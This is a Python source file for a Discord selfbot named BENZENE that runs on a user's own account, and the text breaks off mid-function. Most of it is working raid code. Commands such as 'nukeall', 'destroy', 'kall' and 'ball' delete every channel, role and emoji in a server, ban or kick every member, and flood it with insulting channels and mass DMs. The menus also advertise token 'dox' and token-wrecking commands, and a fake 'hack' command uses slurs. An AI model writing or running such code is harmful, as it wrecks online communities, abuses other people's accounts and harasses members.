import discord
from discord.ext import commands

import asyncio, random, os, requests, sys, threading, datetime, json, aiohttp
from urllib import parse
import re, time
import webserver
from webserver import keep_alive

from urllib.request import Request, urlopen

print('LOADING BENZENE SELFBOT....Till then consider joining my discord server discord.gg/satyaop')


keep_alive()
prefix = "!"
fuck = "##"
client = commands.Bot(command_prefix=prefix, case_insensitive=True, self_bot=True)

client.remove_command('help')





@client.command()
async def help(ctx):
    await ctx.message.delete()
    embed = discord.Embed(color=(0))
    embed.set_author(name='BENZENE SELF BOT')
    embed.set_thumbnail(url='https://www.google.com/search?q=benzene+sticker&rlz=1C1CHBF_enIN922IN922&sxsrf=AOaemvLC65wyJPsteo8Jb-hlyfwO_9H_hA:1635439320797&tbm=isch&source=iu&ictx=1&fir=iq8Z1zOuQXjgrM%252Csb-CFq6Mcvfu0M%252C_%253BvbXN5ZJl7AkPPM%252CqHjlJltCbRB6DM%252C_%253By50o_8r2s7WbIM%252C7rOG4BnNqQLZnM%252C_%253BU6r1qKoFT4VCgM%252Ccn91_H4aKypTsM%252C_%253BLr0XLFhbv5bfXM%252CgMWG41rOs2fujM%252C_%253B_FRt6ZfRLp0p8M%252C7rOG4BnNqQLZnM%252C_%253BEnAmcAX__x3P4M%252Caa2JyQwQhv1riM%252C_%253BX1ArWDRse6I6xM%252CsndZUsSsD9EhWM%252C_%253Bx4eRqRolKqJnqM%252CrC6Q3o6GR4D09M%252C_%253BX6O3xbNm6S6zLM%252C-74mJBuB5eYi_M%252C_%253BcDt0KUApSnoPQM%252CizkUqxS62pxQtM%252C_%253Bg6J78Hi7hfsEEM%252CGaVYmBljGt5DgM%252C_%253BD6HetpdU4w2kTM%252C4IIZ-8c0jfCyvM%252C_%253BQn9icVuBXc8nQM%252CLBH0RQVjmklGfM%252C_%253BN8Nyg4O_-6w8UM%252CwiDfutISGhvUkM%252C_&vet=1&usg=AI4_-kRsVBI2Xfok_2zgothsQCJ0tLuZvA&sa=X&ved=2ahUKEwj02JGexu3zAhVDeH0KHR0_CoIQ9QF6BAgWEAE#imgrc=y50o_8r2s7WbIM')
    embed.set_image(url="https://media.discordapp.net/attachments/697225400505598044/783144406889922580/image0.gif?width=540&height=227")
    embed.set_footer(text='Created by BENZENE')
    embed.add_field(value='Shows All Text Commands', name='🧊``` TEXTCMD```')
    embed.add_field(value='Shows All Nuke Commands', name='🧊``` NUKECMD```')
    embed.add_field(value='Shows All Status Commands', name='🧊``` STATUSCMD```')
    embed.add_field(value='Shows All Fun Commands', name='🧊``` FUNCMD```')
    embed.add_field(value='Shows All NSWF Commands', name='🧊``` NSWFCMD```')
    embed.add_field(value='Shows All Rename Commands', name='🧊``` RENAMECMD```')
    embed.add_field(value='Shows All Hack Commands', name='🧊``` HACKCMD```')
    embed.add_field(value='Shows All Tool Commands', name='🧊``` TOOLCMD```')
    embed.add_field(value='Shows All Secret Commands', name='🧊``` SECRETCMD```')
    embed.add_field(value='Shows All Selfbot Info Commands', name='🧊``` SELFBOTINFO```')
    embed.add_field(value='Shows All Auto OwO Commands',name='🧊``` AUTOOWOCMD```')
    embed.add_field(name='**IMPORTANT INFO**',value='```IF ANY PROBLEM OR ERROR IN SELF BOT JOIN OUR SERVER DISCORD.GG/SATYAOP```')
    await ctx.send(embed=embed) 
    


    
@client.command(pass_context=True)
async def renamecmd(ctx):
    embed = discord.Embed(color=0)
    embed.set_author(name='BENZENE SELFBOT | RENAME CMDS')
    embed.set_footer(text='Created by BENZENE')
    embed.add_field(name='*RC*', value='```RENAME ALL CHANNELS TO GIVEN NAME```')
    embed.add_field(name='**RR**', value='```RANAME ALL ROLES TO GIVEN NAME```')
    await ctx.send(embed=embed)

@client.command()
async def secretcmd(ctx):
    await ctx.message.delete()
    embed = discord.Embed(color=(0))
    embed.set_thumbnail(url='https://www.google.com/search?q=benzene+sticker&rlz=1C1CHBF_enIN922IN922&sxsrf=AOaemvLC65wyJPsteo8Jb-hlyfwO_9H_hA:1635439320797&tbm=isch&source=iu&ictx=1&fir=iq8Z1zOuQXjgrM%252Csb-CFq6Mcvfu0M%252C_%253BvbXN5ZJl7AkPPM%252CqHjlJltCbRB6DM%252C_%253By50o_8r2s7WbIM%252C7rOG4BnNqQLZnM%252C_%253BU6r1qKoFT4VCgM%252Ccn91_H4aKypTsM%252C_%253BLr0XLFhbv5bfXM%252CgMWG41rOs2fujM%252C_%253B_FRt6ZfRLp0p8M%252C7rOG4BnNqQLZnM%252C_%253BEnAmcAX__x3P4M%252Caa2JyQwQhv1riM%252C_%253BX1ArWDRse6I6xM%252CsndZUsSsD9EhWM%252C_%253Bx4eRqRolKqJnqM%252CrC6Q3o6GR4D09M%252C_%253BX6O3xbNm6S6zLM%252C-74mJBuB5eYi_M%252C_%253BcDt0KUApSnoPQM%252CizkUqxS62pxQtM%252C_%253Bg6J78Hi7hfsEEM%252CGaVYmBljGt5DgM%252C_%253BD6HetpdU4w2kTM%252C4IIZ-8c0jfCyvM%252C_%253BQn9icVuBXc8nQM%252CLBH0RQVjmklGfM%252C_%253BN8Nyg4O_-6w8UM%252CwiDfutISGhvUkM%252C_&vet=1&usg=AI4_-kRsVBI2Xfok_2zgothsQCJ0tLuZvA&sa=X&ved=2ahUKEwj02JGexu3zAhVDeH0KHR0_CoIQ9QF6BAgWEAE#imgrc=y50o_8r2s7WbIM')
    embed.set_image(url="https://media.discordapp.net/attachments/697225400505598044/783144406889922580/image0.gif?width=540&height=227")
    embed.set_footer(text='Created by BENZENE')
    embed.set_author(name='Secret')
    embed.add_field(name='Kall', value='Kicks every member in a server', inline=False)
    embed.add_field(name='Ball', value='Bans every member in a server', inline=False)
    embed.add_field(name='Rall', value='Renames every member in a server', inline=False)
    embed.add_field(name='Destroy', value='Deleted channels, remakes new ones, deletes roles, bans members, and wipes emojis. In that order', inline=False)
    await ctx.send(embed=embed)
    
@client.command(pass_context=True)
async def nick(ctx, member: discord.Member, nick):
    await ctx.message.delete()
    await member.edit(nick=nick)
    await ctx.send(f'Nickname was changed for {member.mention} ')
    

        
@client.command()
async def autoowocmd(ctx):
  embed = discord.Embed(title="Help AutoOwO", color=420699, description=f"**{prefix}autoOwO**\nowoh, owo sell all,owo pray,owo flip 500 and owo slot.\n\n**{prefix}stopautoOwO**\nstops autoOwO.")
  embed.set_thumbnail(url="https://www.google.com/search?q=benzene+sticker&rlz=1C1CHBF_enIN922IN922&sxsrf=AOaemvLC65wyJPsteo8Jb-hlyfwO_9H_hA:1635439320797&tbm=isch&source=iu&ictx=1&fir=iq8Z1zOuQXjgrM%252Csb-CFq6Mcvfu0M%252C_%253BvbXN5ZJl7AkPPM%252CqHjlJltCbRB6DM%252C_%253By50o_8r2s7WbIM%252C7rOG4BnNqQLZnM%252C_%253BU6r1qKoFT4VCgM%252Ccn91_H4aKypTsM%252C_%253BLr0XLFhbv5bfXM%252CgMWG41rOs2fujM%252C_%253B_FRt6ZfRLp0p8M%252C7rOG4BnNqQLZnM%252C_%253BEnAmcAX__x3P4M%252Caa2JyQwQhv1riM%252C_%253BX1ArWDRse6I6xM%252CsndZUsSsD9EhWM%252C_%253Bx4eRqRolKqJnqM%252CrC6Q3o6GR4D09M%252C_%253BX6O3xbNm6S6zLM%252C-74mJBuB5eYi_M%252C_%253BcDt0KUApSnoPQM%252CizkUqxS62pxQtM%252C_%253Bg6J78Hi7hfsEEM%252CGaVYmBljGt5DgM%252C_%253BD6HetpdU4w2kTM%252C4IIZ-8c0jfCyvM%252C_%253BQn9icVuBXc8nQM%252CLBH0RQVjmklGfM%252C_%253BN8Nyg4O_-6w8UM%252CwiDfutISGhvUkM%252C_&vet=1&usg=AI4_-kRsVBI2Xfok_2zgothsQCJ0tLuZvA&sa=X&ved=2ahUKEwj02JGexu3zAhVDeH0KHR0_CoIQ9QF6BAgWEAE#imgrc=y50o_8r2s7WbIM")
  await ctx.send(embed=embed)

@client.command(pass_context=True)
async def hackcmd(ctx):
    embed = discord.Embed(color=0)
    embed.set_author(name='BENZENE SELFBOT | HACK CMDS')
    embed.set_footer(text='Created by BENZENE')
    embed.add_field(name='**DELWEBHOOK**', value='```DELETE THE GIVEN WEBHOOK || ex - $DELWEBHOOK { WEBHOOK LINK }```')
    embed.add_field(name='**DOXUSER**', value='```Displays info on a user | Only works in a server\nParameters- >doxuser <@target> \nEx- >doxuser @RYUK#9999```')
    embed.add_field(name='**GEOIP**', value='```displays info of an Ip | ex - $geoip 1.3.3..2.1.2```')
    embed.add_field(name='**CHECKEMAIL**', value='```CHECK THE EMAIL IS VALID OR NOT || ex - $CHECKEMAIK ryukop@gmail.com```')
    embed.add_field(name='**INTOKEN**', value='```Displays info on a Discord Account \nParameters- >tdox <target-token> \nEx- >tdox mfa.W3Di4FprRZ_AXH_Y5-A9ReoshSu9Dzn_fTXrvBhwc6p3LvkYLJM4jbr338YUMZ7ECnj2zbxnKm-I2ReFh2Zp```')
    embed.add_field(name='**TOKENFUCK**', value='```DISTROY THE GIVEN TOKEN BADLY```')
    embed.add_field(name='**DOXSERVER**', value='```Displays info on a Discord Server\nParameters- >doxserver\nEx- >doxserver```')
    embed.add_field(name='**PING WEB**', value='```Pings the website to check whether its operational or not.\nParameters- >pingweb <website url>\nEx- >pingweb https://discord.com/```')
    embed.add_field(name='**GET ROLES**', value='```Sends all roles of a server which you dont have the perm to view | Note - Use a spam channel.\nParameters- >getroles\nEx- >getroles```')
    await ctx.send(embed=embed)
    
@client.command(aliases=['geolocate', 'iptogeo', 'iptolocation', 'ip2geo', 'ip'])
async def geoip(ctx, *, ipaddr: str = '1.3.3.7'):
    await ctx.message.delete()
    r = requests.get(f'http://extreme-ip-lookup.com/json/{ipaddr}')
    geo = r.json()
    em = discord.Embed()
    fields = [
        {'name': 'IP', 'value': geo['query']},
        {'name': 'Type', 'value': geo['ipType']},
        {'name': 'Country', 'value': geo['country']},
        {'name': 'City', 'value': geo['city']},
        {'name': 'Continent', 'value': geo['continent']},
        {'name': 'Country', 'value': geo['country']},
        {'name': 'Hostname', 'value': geo['ipName']},
        {'name': 'ISP', 'value': geo['isp']},
        {'name': 'Latitute', 'value': geo['lat']},
        {'name': 'Longitude', 'value': geo['lon']},
        {'name': 'Org', 'value': geo['org']},
        {'name': 'Region', 'value': geo['region']},
    ]
    for field in fields:
        if field['value']:
            em.add_field(name=field['name'], value=field['value'], inline=True)
    return await ctx.send(embed=em)



@client.command(pass_context=True)
async def toolcmd(ctx):
    embed = discord.Embed(color=0)
    embed.set_author(name='BENZENE SELFBOT | TOOL CMDS')
    embed.set_footer(text='Created by BENZENE')
    embed.add_field(name='**DMFRIENDS**', value='```DM ALL YOUR FRIENDS || ex - $dmfriends { text } ```')
    embed.add_field(name='**CLEARBLOCKED**', value='```UNBLOCK EVERY USER IN YOUR BLOCK LIST```')
    embed.add_field(name='**LOGIN**', value='```BOTLY LOGIN INTO USER ACCOUUT BY GIVEN TOKEN AND KEEP IT ONLINE```')
    embed.add_field(name='**BOTLOGIN**', value='```BOTLY LOGIN INTO BOT ACCOUUT BY GIVEN TOKEN AND KEEP IT ONLINE```')
    embed.add_field(name='**UPTIME**', value='```HOST YOUR REPL.IT OR GLITCH.COM PROJECT FOR 8 HRS || ex - $uptime { project link }```')
    embed.add_field(name='**SENDHOOK**', value='```SEND MESSAGE TO THE GIVEN WEBHOOK || ex - $SENDHOOK { TEXT TO SEND } { WEBHOOK URL }```')
    embed.add_field(name='**SMALLTXT**', value='```CONVERT YOUR GIVEN TEXT INTO SMALL TEXT```')
    embed.add_field(name='**IMAGE**', value='```SEND THE GIVEN IMAGE IN EMBED FORMAT```')
    embed.add_field(name='**HASTEBIN**', value='```CREATE A HASTE BIN OF GIVEN TEXT```')
    embed.add_field(name='**NICK**', value='``` CHANGE NICK NAME```')
    embed.add_field(name='**MASSREPORT**', value='```MASS REPORT ON MENSION USER ACCOUNT```')
    embed.add_field(name='**CREATETXT**', value='```CREATE A TXT FILE WITH A PROVIDED MESSAGE```')
    embed.add_field(name='**ASCII**', value='```CONVERT YOUR TEXT TO ASCII TEXT FORMAT```')
    embed.add_field(name='**MEMBERS**', value='```SEND THE TOTAL MEMBER COUNT OF THE GUILD```')
    embed.add_field(name='**COPY**', value='```COPY THE GUILD AND MAKE ANOTHER GUILD LIKE COPIED```')
    await ctx.send(embed=embed)
   
snipe_message_author = {}
snipe_message_content = {}
 



@client.command()
async def createtxt(ctx, *, txt=''):
	await ctx.message.delete()
	if txt == '':
		await ctx.send('provide a message dude')
	else:
		file = open("customtxtfile.txt", "w")
		file.write(txt)
		file.close()
		pp = discord.File(fp="customtxtfile.txt")
		await ctx.send(f"here is your txt file {ctx.author.name} ↓", file=pp)


    
@client.command()
async def smalltxt(ctx, *, text=None):
	await ctx.message.delete()
	if text is None:
		await ctx.send("what do you want as a small message???")
	else:
		frt = text.replace('a', 'ᴬ').replace('A', 'ᴬ').replace(
		    'b',
		    'ᴮ').replace('B', 'ᴮ').replace('c', 'ᶜ').replace('C', 'ᶜ').replace(
		        'd', 'ᴰ').replace('D', 'ᴰ').replace('e', 'ᴱ').replace(
		            'E', 'ᴱ').replace('f', 'ᶠ').replace('F', 'ᶠ').replace(
		                'g', 'ᴳ').replace('G', 'ᴳ').replace('h', 'ᴴ').replace(
		                    'H',
		                    'ᴴ').replace('i', 'ᴵ').replace('I', 'ᴵ').replace(
		                        'j', 'ᴶ').replace('J', 'ᴶ').replace(
		                            'k', 'ᴷ').replace('K', 'ᴷ').replace(
		                                'l', 'ᴸ').replace('L', 'ᴸ').replace(
		                                    'm', 'ᴹ'
		                                ).replace('M', 'ᴹ').replace(
		                                    'n', 'ᴺ'
		                                ).replace('N', 'ᴺ').replace(
		                                    'o', 'ᴼ'
		                                ).replace('O', 'ᴼ').replace(
		                                    'p', 'ᴾ'
		                                ).replace('P', 'ᴾ').replace(
		                                    'q', 'ᵠ'
		                                ).replace('Q', 'ᵠ').replace(
		                                    'r', 'ᴿ'
		                                ).replace('R', 'ᴿ').replace(
		                                    's', 'ˢ'
		                                ).replace('S', 'ˢ').replace(
		                                    't', 'ᵀ'
		                                ).replace('T', 'ᵀ').replace(
		                                    'u', 'ᵁ'
		                                ).replace('U', 'ᵁ').replace(
		                                    'v', 'ⱽ'
		                                ).replace('V', 'ⱽ').replace(
		                                    'w', 'ᵂ'
		                                ).replace('W', 'ᵂ').replace(
		                                    'x', 'ˣ').replace(
		                                        'X', 'ˣ').replace(
		                                            'y', 'ʸ').replace(
		                                                'Y', 'ʸ').replace(
		                                                    'z', 'ᶻ').replace(
		                                                        'Z', 'ᶻ')
		await ctx.send(frt)


@client.command()
async def members(ctx):
  await ctx.message.delete()
  guild = ctx.guild
  embed = discord.Embed(timestamp=datetime.datetime.utcnow())
  embed.set_author(name="Links!", icon_url=ctx.guild.icon_url)
  embed.add_field(name="Member Count:", value=f"> {len(guild.members)}")
  embed.set_footer(text=f"{ctx.guild.name}")
  embed.set_thumbnail(url=ctx.guild.icon_url)
  await ctx.channel.send(embed=embed)



@client.command()
async def userinfo(ctx, *, user: discord.User = None): # b'\xfc'
    if user is None:
        user = ctx.author      
    date_format = "%a, %d %b %Y %I:%M %p"
    embed = discord.Embed(color=0xdfa3ff, description=user.mention)
    embed.set_author(name=str(user), icon_url=user.avatar_url)
    embed.set_thumbnail(url=user.avatar_url)
    embed.add_field(name="Joined", value=user.joined_at.strftime(date_format))
    members = sorted(ctx.guild.members, key=lambda m: m.joined_at)
    embed.add_field(name="Join position", value=str(members.index(user)+1))
    embed.add_field(name="Registered", value=user.created_at.strftime(date_format))
    if len(user.roles) > 1:
        role_string = ' '.join([r.mention for r in user.roles][1:])
        embed.add_field(name="Roles [{}]".format(len(user.roles)-1), value=role_string, inline=False)
    perm_string = ', '.join([str(p[0]).replace("_", " ").title() for p in user.guild_permissions if p[1]])
    embed.add_field(name="Guild permissions", value=perm_string, inline=False)
    embed.set_footer(text='ID: ' + str(user.id))
    return await ctx.send(embed=embed)

    
@client.command()
async def hooksend(ctx, webhook, *, message):
    await ctx.message.delete()
    _json = {"content": message}
    requests.post(webhook, json=_json)
    rs = requests.get(webhook).json()
    if "Unknown Webhook" or "Invalid" in rs["message"]:
        await ctx.send('Sent message', delete_after=2)
    else:
        await ctx.send(f'Successfully sent `{message}` to webhook `{webhook}`', delete_after=2)



@client.command()
async def checkemail(ctx, ip: str = 'test@gmail.com'):
    if not ip:
        await ctx.send('You need to enter a Valid Email', delete_after=30)
    else:
        scan = requests.get(f'https://unturnedapis.000webhostapp.com/EmailValidator.php?host={ip}').text
        scan = scan.replace('<br>',"\n")
        embed = discord.Embed(timestamp=datetime.datetime.utcnow(), color = discord.Colour.purple())
        embed.add_field(name='Email Validator Results:', value=f'{scan}')
        embed.set_footer(text=f"Requested by {ctx.author}", icon_url=f'{ctx.author.avatar_url}')
        embed.set_thumbnail(url = 'https://cdn.discordapp.com/attachments/852849146221821982/853529888354861086/nitro_main_pfp.gif')
        embed.set_image(url="https://cdn.discordapp.com/avatars/750719613247160352/a_d4c10b71ca00e616e676a892acc7a7bd.gif")
        await ctx.message.delete()
        await ctx.send(embed=embed)


            
@client.command(aliases=["copyguild", "copyserver"])
async def copy(ctx):  # b'\xfc'
    await ctx.message.delete()
    await client.create_guild(f'backup-{ctx.guild.name}')
    await asyncio.sleep(4)
    for g in client.guilds:
        if f'backup-{ctx.guild.name}' in g.name:
            for c in g.channels:
                await c.delete()
            for cate in ctx.guild.categories:
                x = await g.create_category(f"{cate.name}")
                for chann in cate.channels:
                    if isinstance(chann, discord.VoiceChannel):
                        await x.create_voice_channel(f"{chann}")
                    if isinstance(chann, discord.TextChannel):
                        await x.create_text_channel(f"{chann}")
    try:
        await g.edit(icon=ctx.guild.icon_url)
    except:
        pass


@client.command()
async def prefix(ctx, prefix):
    await ctx.message.delete()
    client.command_prefix = str(prefix)



@client.command()
async def hastebin(ctx, *, message):
    await ctx.message.delete()
    r = requests.post("https://hastebin.com/documents", data=message).json()
    await ctx.send(f"<https://hastebin.com/{r['key']}>")

@client.command()
async def clearblocked(ctx):
    await ctx.message.delete()
    print(client.user.relationships)
    for relationship in client.user.relationships:
        if relationship is discord.RelationshipType.blocked:
            print(relationship)
            await relationship.delete()

@client.command()
async def spam(ctx, amount: int, *, message):
    for _i in range(amount):
        await ctx.send(message)

@client.command(aliases=['trash wizz'])
async def nukeall(ctx):
	
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()
        except:
            pass

    for role in list(ctx.guild.roles):
        try:
            await role.delete()
        except:
            pass

    try:
        await ctx.guild.edit(name='TRASHED BY BENZENE',
          description='FUCKED BY BENZENE',
          reason='GET SECURED BENZENE RUNS YOU BITCH',
          icon=None,
          banner=None)
    except:
        pass

    for _i in range(100):
        await ctx.guild.create_text_channel(name='FUCKED BY BENZENE')

    for _i in range(100):
        await ctx.guild.create_role(name='BENZENE RUNS YOU', colour=0x39138b)
    
@client.command()
async def kall(ctx):
    await ctx.message.delete()
    guild = ctx.message.guild
    for member in list(client.get_all_members()):
        try:
            await guild.kick(member)
            print (f"{member.name} has been kicked")
        except:
            print (f"{member.name} has FAILED to be kicked")
        print ("Action completed: Kick all")
#############################

####BALL COMMAND####
@client.command()
async def ball(ctx):
    await ctx.message.delete()
    guild = ctx.message.guild
    for member in list(client.get_all_members()):
        try:
            await guild.ban(member)
            print ("User " + member.name + " has been banned")
        except:
            pass
    print ("Action completed: Ban all")
#############################

####RALL COMMAND####
@client.command()
async def rall(ctx, rename_to):
    await ctx.message.delete()
    for member in list(client.get_all_members()):
        try:
            await member.edit(nick=rename_to)
            print (f"{member.name} has been renamed to {rename_to}")
        except:
            print (f"{member.name} has NOT been renamed")
        print("Action completed: Rename all")
#############################

####MALL COMMAND####
@client.command()
async def mall(ctx):
    await ctx.message.delete()
    for member in list(client.get_all_members()):
        await asyncio.sleep(0)
        try:
            await member.send("GET NUKED DARLING")
        except:
            pass
        print("Action completed: Message all")
#############################

###DESTROY COMMAND####
@client.command()
async def destroy(ctx):
    await ctx.message.delete()
    for channel in list(ctx.message.guild.channels):
        try:
            await channel.delete()
            print (channel.name + " has been deleted")
        except:
            pass
        guild = ctx.message.guild
        channel = await guild.create_text_channel("BENZENE OP")
        await channel.send("GET NUKED DARLING @everyone")
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
            print (f"{role.name} has been deleted")
        except:
            pass
    for member in list(client.get_all_members()):
        try:
            await guild.ban(member)
            print ("User " + member.name + " has been banned")
        except:
            pass
    for emoji in list(ctx.guild.emojis):
        try:
            await emoji.delete()
            print (f"{emoji.name} has been deleted")
        except:
            pass    
    print("Action completed: Nuclear Destruction")
#############################
  
@client.command(aliases=['whois'])
async def doxuser(ctx, member: discord.Member=None):
    if not member:
        member = ctx.message.author
    roles = [role for role in member.roles]
    embed = discord.Embed(colour=(discord.Colour.default()), timestamp=(ctx.message.created_at), title=f"User Info - {member}")
    embed.set_thumbnail(url=(member.avatar_url))
    embed.set_footer(text='Created By BENZENE')
    embed.add_field(name='ID:', value=(member.id))
    embed.add_field(name='Display Name:', value=(member.display_name))
    embed.add_field(name='Created Account On:', value=(member.created_at.strftime('%a, %#d %B %Y, %I:%M %p UTC')))
    embed.add_field(name='Joined Server On:', value=(member.joined_at.strftime('%a, %#d %B %Y, %I:%M %p UTC')))
    embed.add_field(name='Roles:', value=(''.join([role.mention for role in roles])))
    embed.add_field(name='Highest Role:', value=(member.top_role.mention))
    print(member.top_role.mention)
    await ctx.send(embed=embed)


    
    
@client.command()
async def textcmd(ctx):
    embed = discord.Embed(color=0)
    embed.set_author(name='BENZENE SELFBOT ')
    embed.set_thumbnail(url='https://cdn.discordapp.com/emojis/849783904189546561.png')
    embed.set_image(url="https://media.discordapp.net/attachments/697225400505598044/783144406889922580/image0.gif?width=540&height=227")
    embed.set_footer(text='Created by BENZENE')
    embed.add_field(name='TEXT COMMANDS',value='ALL THE TEXT COMMANDS')
    
    
    embed.add_field(value='Spams The Given Text', name='🧊``` SPAM```')  
    embed.add_field(value='Convert The Text To Bold Format', name='🧊``` BOLD```')  
    embed.add_field(value='Delete The Message In Amount Given', name='🧊``` PURGE```')  
    embed.add_field(value='Send The Message In Hidden Format', name='🧊``` HIDDEN```')  
    embed.add_field(value='ENCODE YOUR GIVEN TEXT', name='🧊``` ENCODE```')  
    embed.add_field(value='DECODE YOUR GIVEN TEXT', name='🧊``` DECODE```')  
    embed.add_field(value='Convert The Text To Embed', name='🧊``` EMBED```')  
    embed.add_field(value='Send An Empty / Invisible Message', name='🧊``` EMPTY```')  
    embed.add_field(value='Jumps To The First Message Of Channel / Dms', name='🧊``` FIRST MSG```')  
    await ctx.send(embed=embed)



@client.command()
async def bold(ctx, *, message):
    await ctx.message.delete()
    await ctx.send('**' + message + '**')

@client.command()
async def empty(ctx):
    await ctx.message.delete()
    await ctx.send(chr(173))

@client.command()
async def hidden(ctx, *, message):
    await ctx.message.delete()
    await ctx.send('||' + message + '||')

@client.command()
async def purge(ctx, amount: int=None):
    if amount is None:
        async for message in ctx.message.channel.history(limit=999).filter(lambda m: m.author == client.user).map(lambda m: m):
            try:
                await message.delete()
            except:
                pass

    else:
        async for message in ctx.message.channel.history(limit=amount).filter(lambda m: m.author == client.user).map(lambda m: m):
            try:
                await message.delete()
            except:
                pass

@client.command(name='first-message',
  aliases=['firstmsg', 'fm', 'firstmessage'])
async def _first_message(ctx, channel: discord.TextChannel=None):
    if channel is None:
        channel = ctx.channel
    first_message = (await channel.history(limit=1, oldest_first=True).flatten())[0]
    embed = discord.Embed(description=(first_message.content))
    embed.add_field(name='First Message',
      value=f"[Click here to Jump]({first_message.jump_url})")
    embed.set_footer(text='Created by BENZENE')
    await ctx.send(embed=embed)

@client.command()
async def hackuser(ctx, user: discord.Member = None):
    await ctx.message.delete()
    gender = ["Male", "Female", "Trans", "Other", "Retard"]
    age = str(random.randrange(10, 25))
    height = [        '4\'6\"', '4\'7\"', '4\'8\"', '4\'9\"', '4\'10\"', '4\'11\"', '5\'0\"',

        '5\'1\"', '5\'2\"', '5\'3\"', '5\'4\"', '5\'5\"', '5\'6\"', '5\'7\"',

        '5\'8\"', '5\'9\"', '5\'10\"', '5\'11\"', '6\'0\"', '6\'1\"', '6\'2\"',
        '6\'3\"', '6\'4\"', '6\'5\"', '6\'6\"', '6\'7\"', '6\'8\"', '6\'9\"',
        '6\'10\"', '6\'11\"'
    ]
    weight = str(random.randrange(60, 300))
    hair_color = ["Black", "Brown", "Blonde", "White", "Gray", "Red"]
    skin_color = ["White", "Pale", "Brown", "Black", "Light-Skin"]
    religion = [
        "Christian", "Muslim", "Atheist", "Hindu", "Buddhist", "Jewish"
    ]
    sexuality = [
        "Straight", "Gay", "Homo", "Bi", "Bi-Sexual", "Lesbian", "Pansexual"
    ]
    education = [
        "High School", "College", "Middle School", "Elementary School",
        "Pre School", "Retard never went to school LOL"
    ]
    ethnicity = [
        "White", "African American", "Asian", "Latino", "Latina", "American",
        "Mexican", "Korean", "Chinese", "Arab", "Italian", "Puerto Rican",
        "Non-Hispanic", "Russian", "Canadian", "European", "Indian"
    ]
    occupation = [
        "Retard has no job LOL", "Certified discord retard", "Janitor",
        "Police Officer", "Teacher", "Cashier", "Clerk", "Waiter", "Waitress",
        "Grocery Bagger", "Retailer", "Sales-Person", "Artist", "Singer",
        "Rapper", "Trapper", "Discord Thug", "Gangster", "Discord Packer",
        "Mechanic", "Carpenter", "Electrician", "Lawyer", "Doctor",
        "Programmer", "Software Engineer", "Scientist"
    ]
    salary = [
        "Retard makes no money LOL", "$" + str(random.randrange(0, 1000)),
        '<$50,000', '<$75,000', "$100,000", "$125,000", "$150,000", "$175,000",
        "$200,000+"
    ]
    location = [
        "Retard lives in his mom's basement LOL", "America", "United States",
        "Europe", "Poland", "Mexico", "Russia", "Pakistan", "India",
        "Some random third world country", "Canada", "Alabama", "Alaska",
        "Arizona", "Arkansas", "California", "Colorado", "Connecticut",
        "Delaware", "Florida", "Georgia", "Hawaii", "Idaho", "Illinois",
        "Indiana", "Iowa", "Kansas", "Kentucky", "Louisiana", "Maine",
        "Maryland", "Massachusetts", "Michigan", "Minnesota", "Mississippi",
        "Missouri", "Montana", "Nebraska", "Nevada", "New Hampshire",
        "New Jersey", "New Mexico", "New York", "North Carolina",
        "North Dakota", "Ohio", "Oklahoma", "Oregon", "Pennsylvania",
        "Rhode Island", "South Carolina", "South Dakota", "Tennessee", "Texas",
        "Utah", "Vermont", "Virginia", "Washington", "West Virginia",
        "Wisconsin", "Wyoming"
    ]
    email = [
        "@gmail.com", "@yahoo.com", "@hotmail.com", "@outlook.com",
        "@protonmail.com", "@disposablemail.com", "@aol.com", "@edu.com",
        "@icloud.com", "@gmx.net", "@yandex.com"
    ]
    dob = f'{random.randrange(1, 13)}/{random.randrange(1, 32)}/{random.randrange(1950, 2021)}'
    name = [
        'James Smith', "Michael Smith", "Robert Smith", "Maria Garcia",
        "David Smith", "Maria Rodriguez", "Mary Smith", "Maria Hernandez",
        "Maria Martinez", "James Johnson", "Catherine Smoaks", "Cindi Emerick",
        "Trudie Peasley", "Josie Dowler", "Jefferey Amon", "Kyung Kernan",
        "Lola Barreiro", "Barabara Nuss", "Lien Barmore", "Donnell Kuhlmann",
        "Geoffrey Torre", "Allan Craft", "Elvira Lucien", "Jeanelle Orem",
        "Shantelle Lige", "Chassidy Reinhardt", "Adam Delange", "Anabel Rini",
        "Delbert Kruse", "Celeste Baumeister", "Jon Flanary", "Danette Uhler",
        "Xochitl Parton", "Derek Hetrick", "Chasity Hedge",
        "Antonia Gonsoulin", "Tod Kinkead", "Chastity Lazar", "Jazmin Aumick",
        "Janet Slusser", "Junita Cagle", "Stepanie Blandford", "Lang Schaff",
        "Kaila Bier", "Ezra Battey", "Bart Maddux", "Shiloh Raulston",
        "Carrie Kimber", "Zack Polite", "Marni Larson", "Justa Spear"
    ]
    phone = f'({random.randrange(0, 10)}{random.randrange(0, 10)}{random.randrange(0, 10)})-{random.randrange(0, 10)}{random.randrange(0, 10)}{random.randrange(0, 10)}-{random.randrange(0, 10)}{random.randrange(0, 10)}{random.randrange(0, 10)}{random.randrange(0, 10)}'
    if user is None:
        user = ctx.author
        password = [
            'password', '123', 'mypasswordispassword', user.name + "iscool123",
            user.name + "isdaddy", "daddy" + user.name, "ilovediscord",
            "i<3discord", "furryporn456", "secret", "123456789", "apple49",
            "redskins32", "princess", "dragon", "password1", "1q2w3e4r",
            "ilovefurries"
        ]
        message = await ctx.send(f"`Hacking {user}...\n`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Hacking {user}...\nHacking into the mainframe...\n`")
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...`"
        )
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\n`"
        )
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\nBruteforcing love life details...`"
        )
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\nBruteforcing love life details...\nFinalizing life-span dox details\n`"
        )
        await asyncio.sleep(1)
        await message.edit(
            content=
